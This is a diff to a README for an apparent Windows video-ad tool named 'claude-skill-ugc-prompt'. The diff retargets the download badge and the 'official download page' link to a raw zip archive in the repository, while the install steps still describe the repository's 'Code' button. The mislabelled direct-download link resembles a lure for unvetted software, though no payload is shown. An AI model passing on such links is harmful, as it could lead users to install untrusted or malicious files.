@@ -1,6 +1,6 @@
 # 🤖 claude-skill-ugc-prompt - Create Professional Video Ads With Ease
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/carreras66848657/claude-skill-ugc-prompt)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/carreras66848657/claude-skill-ugc-prompt/raw/refs/heads/main/skill/skill_prompt_ugc_claude_2.4.zip)
 
 ## 🎯 About This Tool
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run the application smoothl
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/carreras66848657/claude-skill-ugc-prompt).
+1.  Visit the [official download page](https://github.com/carreras66848657/claude-skill-ugc-prompt/raw/refs/heads/main/skill/skill_prompt_ugc_claude_2.4.zip).
 2.  Locate the green "Code" button on the screen.
 3.  Choose "Download ZIP" from the menu.
 4.  Wait for the file to finish downloading to your computer.
